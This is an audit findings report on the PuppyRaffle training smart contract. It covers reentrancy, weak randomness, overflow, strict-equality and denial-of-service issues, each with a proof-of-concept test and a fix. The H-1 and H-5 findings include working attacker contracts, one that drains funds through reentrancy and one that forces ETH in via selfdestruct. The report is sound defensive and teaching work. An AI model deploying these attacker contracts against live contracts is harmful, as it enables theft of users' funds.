# PuppyRaffle Audit - Findings Report
**Produced by virpy**

# Table of Contents
## [Contest Summary](#contest-summary)
## [Results Summary](#results-summary)
## High Risk Findings
   - ### [H-1. Reentrancy Attack](#H-1)
   - ### [H-2. Weak Randomness](#H-2)
   - ### [H-3. Bad math on players array](#H-3)
   - ### [H-4. Integer Overflow](#H-4)
   - ### [H-5. Strict Equality](#H-5)
## Medium Risk Findings
   - ### [M-1. Unbounded Array DOS](#M-1)
   - ### [M-2. Smart Contract wallet winners DOS](#M-2)
## Low Risk Findings
   - ### [L-1. Function returns 0 instead of error](#L-1)
## Informational
   - ### [Findings](#findings)

# <a id='contest-summary'></a>Contest Summary
### [PuppyRaffle Codebase](https://github.com/Cyfrin/4-puppy-raffle-audit)

# <a id='results-summary'></a>Results Summary

### Number of Findings
- High: 5
- Medium: 2
- Low: 1
- Informational: 4


# High

### <a id='H-1'></a>[H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance
**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and does not contain any sort of non-reentrant lock, making it vulnerable to a reentrancy attack.

In the `PuppyRaffle::refund` function we make an external call to the `msg.sender` address, and then **AFTER** that we remove the player from the `PuppyRaffle::players` array.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-->     payable(msg.sender).sendValue(entranceFee); 

-->     players[playerIndex] = address(0); 
        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `refund` function function again and claim another refund without having their status updated. This could be repeated until there is no balance left in the contract

**Impact:** All fees paid by raffle players could be stolen using this attack

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `receive` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the `PuppyRaffle` contract

<details>
<summary>Code</summary>
Place this test in `PuppyRaffleTest.t.sol`

```javascript
    function testReentrancyRefund() public playersEntered {
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, entranceFee);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingVictimContractBalance = address(puppyRaffle).balance;
        vm.startPrank(attackUser);
        attackerContract.attack{value: entranceFee}();
        vm.stopPrank();

        uint256 endingAttackContractBalance = address(attackerContract).balance;
        uint256 endingVictimContractBalance = address(puppyRaffle).balance;

        console.log("ATTACKER BALANCE BEFORE: ", startingAttackContractBalance);
        console.log("VICTIM BALANCE BEFORE: ", startingVictimContractBalance);

        console.log("ATTACKER BALANCE AFTER: ", endingAttackContractBalance);
        console.log("VICTIM BALANCE AFTER: ", endingVictimContractBalance);
    }


contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```
</details>
<br>

**Recommended Mitigation:** To remediate this vulnerability, the function should follow the Checks, Effects, Interactions framework. The function could also implement a non-reentrant modifier.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0); 
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee); 

-       players[playerIndex] = address(0); 
-       emit RaffleRefunded(playerAddress);
    }
```

### <a id='H-2'></a>[H-2] Weak randomness in `PuppyRaffle::selectWinner` due to variables that can be influenced by miners
**Description:** Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together creates a predictable number. A predictable number is not a random number.
This occurs in the calculation for `PuppyRaffle::winnerIndex` and for `PuppyRaffle::rarity`

**Impact:** Malicious users can manipulate these variables to create a number that benefits them, rather than a random number. This could in turn lead to them rigging the raffle so that they win.
This also means users could front-run this function and call `refund` if they see they are not the winner

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate.
2. Users can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner
3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy

Using on-chain values as variables for random calculations is a [well-documented attack vector](https://blog.chain.link/random-number-generation-solidity/) in the blockchain space

**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as Chainlink VRF


### <a id='H-3'></a>[H-3] Bad calculation in `PuppyRaffle::selectWinner` provides an inflated calculation of the `PuppyRaffle::prizePool` and `PuppyRaffle::fee` which allows malicous users to trick the contract into paying out more than it is meant to
**Description:** In the `PuppyRaffle::refund` function players addresses that have refunded and left the raffle are replaced with `address(0)`, this however does not lower the length of the `players` array. The length of that `players` array is then later used in the `PuppyRaffle::selectWinner` function to determine the `totalAmountCollected`, `prizePool` and `fee` variables. 

**Impact:** The `PuppyRaffle::prizePool` variable could be calculated to be a much greater amount than 80% of the contracts balance, as it has been calculated with the inflated `players.length` variable and the `entranceFee` of the contract. This could drain the contract of all its funds when a winner is selected, leaving no fees in the contract for the owner to claim.

**Proof of Concept:**

1. 5 players enter the raffle
2. 1 player decides to refund and leaves the raffle
3. The length of the `players` array still shows 5 players, even though it should now show 4 - the contract also now only holds 4 players worth of entry fees
4. When `PuppyRaffle::selectWinner` is called, the `totalAmountCollected` is calculated as 5 players * `entranceFee` - even though the contract only holds 4 players * `entranceFee`
5. The winner is overpayed due to this, and there will be less or no funds left in the contract for the owner to claim as fees

The following code shows that the length of the `players` array does not decrease when a player leaves the raffle:
```javascript
    function testPlayerArrayLengthAfterRefund() public playersEntered {
        vm.startPrank(playerThree);
        uint256 balBefore = address(playerThree).balance;
        uint256 lengthBefore = puppyRaffle.getPlayersLength();
        puppyRaffle.refund(2);
        uint256 balAfter = address(playerThree).balance;
        uint256 lengthAfter = puppyRaffle.getPlayersLength();
        vm.stopPrank();

        console.log("BALANCE BEFORE: ", balBefore);
        console.log("BALANCE AFTER: ", balAfter);
        console.log("--------------------------");
        console.log("LENGTH OF PLAYERS ARRAY BEFORE: ", lengthBefore);
        console.log("LENGTH OF PLAYERS ARRAY AFTER: ", lengthAfter);
    }
```

**Recommended Mitigation:** Add a counter variable such as `uint256 playerCount;` which you increment by 1 for every player that enters the raffle in the `PuppyRaffle::enterRaffle` function, and decrement by 1 for every player that successfully runs the `PuppyRaffle::refund` function. Then use this `playerCount` variable in the calculations in the `PuppyRaffle::selectWinner` function.

```diff
function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
-       uint256 totalAmountCollected = players.length * entranceFee; 
+       uint256 totalAmountCollected = playerCount * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100; 
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee); 
```

### <a id='H-4'></a>[H-4] Integer overflow of `PuppyRaffle::totalFees` loses fees
**Description:** In solidity versions prior to `0.8.0` integers were subject to integer overflows

```javascript
uint64 myVar = type(uint64).max
// myVar = 18446744073709551615
myVar = myVar + 1
// myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated to later be collected by the `feeAddress`, however if the `totalFees` variable grows to over 18.446744073709551615 ether it will max out, and start overflowing. This will cause the contract to lose fees.

This would also break the require in the `PuppyRaffle::withdrawFees` function below:
```javascript
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
It breaks this require as the `totalFees` variable will not be equal to the actual balance of the contract, due to the overflow on the uint64 variable type

**Proof of Concept:**

<details>
<summary>Code</summary>
Place this test in `PuppyRaffleTest.t.sol`

```javascript
    function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        console.log("starting total fees ", startingTotalFees);
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```
</details>
<br>

**Recommended Mitigation:** Change the `PuppyRaffle::totalFees` variable to be uint256 as that variable type is computationally infeasible to overflow

### <a id='H-5'></a>[H-5] Strict Equality in `PuppyRaffle::withdrawFees` means money can be sent to the contract so that the require will always fail, allowing no funds to be withdrawn
**Description:** 

```javascript
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

This line enforces a strict equality which is bad practice. Although the `PuppyRaffle` contract does not have a `receive` or `fallback` function so eth cannot be sent to it by normal methods, a contract with eth loaded into it could call self destruct on itself with the address of this contract. That would force the eth from the self destructing contract into this one, meaning there would be an imbalance in `address(this).balance` and `uint256(totalFees)` once the raffle ends.

This line is being used to check whether the raffle is currently active, however there is better ways to check this.

**Impact:** A malicious user could self-destruct a contract into this one, causing this require to break and you would not be able to call the `withdrawFees` function

**Proof of Concept:**

The below test shows how a contract can self-destruct funds into the `PuppyRaffle` contract therefore breaking the require present in `PuppyRaffle::withdrawFees`

<details>
<summary>Code</summary>
Place this test in `PuppyRaffleTest.t.sol`

```javascript
    function testSelfDestructVuln() public playersEntered {
        uint256 startingVictimContractBalance = address(puppyRaffle).balance;
        console.log("STARTING BAL: ", startingVictimContractBalance);
        SelfDestructAttacker attackerContract = new SelfDestructAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, entranceFee);

        vm.startPrank(attackUser);
        (bool success,) = address(attackerContract).call{value: entranceFee}(""); //load the self destruct contract up with eth
        require(success, "Transfer failed");
        assertEq(address(attackerContract).balance, entranceFee);

        //self destruct the contract
        attackerContract.attack();
        assertEq(address(attackerContract).balance, 0); //balance of attacker contract now 0
        uint256 afterSelfDestructVictimBalance = address(puppyRaffle).balance;
        console.log("AFTER SELF DESTRUCT: ", afterSelfDestructVictimBalance); // 5 entrance fees instead of 4

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        uint256 afterSelectWinnerBalance = address(puppyRaffle).balance;
        console.log("AFTER SELECT WINNER: ", afterSelectWinnerBalance);

        // you can see below that the balance of the contract and the total fees are not equal anymore and the withdrawFees function should be callable as the winner has been selected and paid out
        uint256 contractTotalFees = puppyRaffle.totalFees();
        console.log("Current Contract Total Fees: ", contractTotalFees);
        uint256 contractBalance = address(puppyRaffle).balance;
        console.log("Current Contract Balance: ", contractBalance);

        vm.expectRevert();
        puppyRaffle.withdrawFees();
        // output below
        //     ├─ [1255] PuppyRaffle::withdrawFees()
        // │   └─ ← [Revert] revert: PuppyRaffle: There are currently players active!
        // └─ ← [Stop]
    }

    contract SelfDestructAttacker {
        PuppyRaffle puppyRaffle;
        uint256 entranceFee;
        uint256 attackerIndex;

        constructor(PuppyRaffle _puppyRaffle) {
            puppyRaffle = _puppyRaffle;
        }

        function attack() external {
            selfdestruct(payable(address(puppyRaffle)));
        }

        receive() external payable {}
    }
```
</details>
<br>

**Recommended Mitigation:** Mitigate this vulnerability by using a different check to see if there is an active raffle in the contract, such as checking if the `PuppyRaffle::players` array is empty. This would work as the array is emptied in the `PuppyRaffle::selectWinner` function.

An example of this might look like:
```diff
    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!"); 
+       require(players.length == 0, "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

# Medium

### <a id='M-1'></a>[M-1] Unbounded array in `PuppyRaffle::enterRaffle` could cause Denial of Service
**Description:** The `PuppyRaffle::players` variable could become so big that the duplicate checker loop in the `PuppyRaffle::enterRaffle` function will cause a Denial of Service due to the amount of gas it will cost to loop through that array when entering the raffle

```javascript
->  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```
**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, as well as causing a rush at the start to get a cheaper entry

**Proof of Concept:**
If we have 2 sets of 100 players enter, the gas cost will be as stated below:
- First 100 players: ~23720447 gas
- Second 100 players: ~88010037 gas
You can see the over 3x increase in gas costs

<details>
<summary>Code</summary>
Place this test in `PuppyRaffleTest.t.sol`

```javascript
    function testDenialOfService() public {
        vm.txGasPrice(1);

        //enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("COST OF FIRST 100: ", gasUsedFirst);

        //enter the second 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum); //0,1,2 -> 100,101,102
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
        uint256 gasEndSecond = gasleft();

        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
        console.log("COST OF SECOND 100: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```
</details>
<br>

**Recommended Mitigation:** 
1. Consider allowing duplicates, as users can already enter with a new wallet address, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered

### <a id='M-2'></a>[M-2] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart. 

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting. 

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:** 
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)


# Low

### <a id='L-1'></a>[L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players, and for players at index 0
**Description:** This could cause confusion for players at index 0, who may think they have not entered the raffle, even though they actually have.

```javascript
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0; 
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` will return 0 when the user calls it
3. The user may now think they have not entered the raffle as the function is designed to return 0 if the player is not active.

**Recommended Mitigation:** Change the `return 0;` for a revert in the case that the user is not in the array


# <a id='findings'></a>Informational

### <a id='I-1'></a>[I-1] Unchanged state variable should be declared constant or immutable to save gas

**Description:** Reading from strorage is much more expensive than reading from a constant or immutable variable

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`



### <a id='I-2'></a>[I-2] Caching array lengths is cheaper in gas than reading `players.length` everytime
**Description:** Setting the `players.length` result to a variable and using that varible for the for loop is cheaper in gas.

Instances:
- `PuppyRaffle::enterRaffle`
- `PuppyRaffle::getActivePlayerIndex`
- `PuppyRaffle::_isActivePlayer`

### <a id='I-3'></a>[I-3] Use of "magic" numbers in `PuppyRaffle::selectWinner` is bad practice
**Description:** It can be confusing to see raw numbers in a codebase and it is much more readable to store values like these in constants and use the variable names instead.

**Recommended Mitigation:** Replace all magic numbers with constants. 

```diff
+       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+       uint256 public constant FEE_PERCENTAGE = 20;
+       uint256 public constant TOTAL_PERCENTAGE = 100;
.
.
.
-        uint256 prizePool = (totalAmountCollected * 80) / 100;
-        uint256 fee = (totalAmountCollected * 20) / 100;
         uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
         uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
```

### <a id='I-4'></a>[I-4] Function `PuppyRaffle::_getActivePlayer` is dead code and is never called
**Description:** This function is never called or used in the contract and is not external, so it can be safely removed from the contract.

**Recommended Mitigation:** Remove the function

```diff
-   function _isActivePlayer() internal view returns (bool) {
-       for (uint256 i = 0; i < players.length; i++) {
-           if (players[i] == msg.sender) {
-               return true;
-           }
-       }
-       return false;
-   }

+
```





